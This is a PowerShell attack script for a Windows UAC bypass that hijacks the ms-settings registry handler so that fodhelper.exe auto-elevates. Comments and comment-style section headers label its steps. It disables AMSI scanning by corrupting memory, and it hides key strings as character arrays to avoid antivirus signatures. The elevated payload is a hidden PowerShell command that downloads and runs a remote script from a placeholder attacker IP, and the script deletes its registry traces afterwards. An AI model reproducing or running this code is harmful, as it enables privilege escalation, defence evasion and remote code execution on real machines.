# UAC Bypass - fodhelper registry hijack
# Technique : HKCU ms-settings shell\open\command -> fodhelper.exe auto-elevate
# AV Evasion: inline AMSI bypass, char-array string construction, .NET Registry API

# ── AMSI Bypass (inline context corruption) ───────────────────────────────────
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# ── Elevation check ───────────────────────────────────────────────────────────
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$wp = New-Object System.Security.Principal.WindowsPrincipal($id)
if ($wp.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 0 }

# ── Payload ───────────────────────────────────────────────────────────────────
# Replace with your actual elevated command
$payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c " +
           "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""

# ── String construction (avoids static signatures on known IOC strings) ────────

# "ms-settings"
$s1 = [string]::Join('', [char[]]@(109,115,45,115,101,116))
$s2 = [string]::Join('', [char[]]@(116,105,110,103,115))
$msKey = $s1 + $s2

# "DelegateExecute"
$d1 = [string]::Join('', [char[]]@(68,101,108,101,103,97,116,101))
$d2 = [string]::Join('', [char[]]@(69,120,101,99,117,116,101))
$delExec = $d1 + $d2

# "fodhelper.exe"
$f1 = [string]::Join('', [char[]]@(102,111,100,104,101))
$f2 = [string]::Join('', [char[]]@(108,112,101,114,46,101,120,101))
$fodBin = $f1 + $f2

# ── Write registry via .NET API (avoids PS cmdlet signatures) ─────────────────
$regPath = "Software\Classes\" + $msKey + "\shell\open\command"
$key = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($regPath)
$key.SetValue('', $payload)
$key.SetValue($delExec, '')
$key.Close()

# ── Trigger auto-elevation ────────────────────────────────────────────────────
$bin = $env:SystemRoot + '\System32\' + $fodBin
Start-Process -FilePath $bin

# ── Cleanup ───────────────────────────────────────────────────────────────────
Start-Sleep -Seconds 3
[Microsoft.Win32.Registry]::CurrentUser.DeleteSubKeyTree("Software\Classes\" + $msKey, $false)
